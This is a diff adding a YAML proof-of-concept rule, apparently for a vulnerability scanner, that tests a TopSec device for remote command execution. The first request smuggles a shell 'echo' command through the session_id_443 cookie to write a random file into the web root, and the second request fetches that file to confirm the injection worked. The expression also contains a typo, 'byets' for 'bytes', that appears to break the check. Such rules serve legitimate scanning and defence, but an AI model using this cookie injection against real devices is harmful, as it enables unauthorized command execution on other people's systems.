@@ -1,0 +1,16 @@
+name: poc-yaml-trx-topsec-rce
+set: 
+  randstr: randomLowercase(20)
+  randname: randomLowercase(5)
+rules:
+  - method: GET
+    path: '/cgi/maincgi.cgi?Url=aa'
+    headers:
+      Cookie: "session_id_443=1|echo {{randstr}} > /www/htdocs/site/image/{{randname}}.txt;"
+    expression: |
+      response.status == 200
+  - method: GET
+    path: '/site/image/{{randname}}.txt'
+    expression: |
+      response.status == 200 && response.body.bcontains(byets(randstr))
+
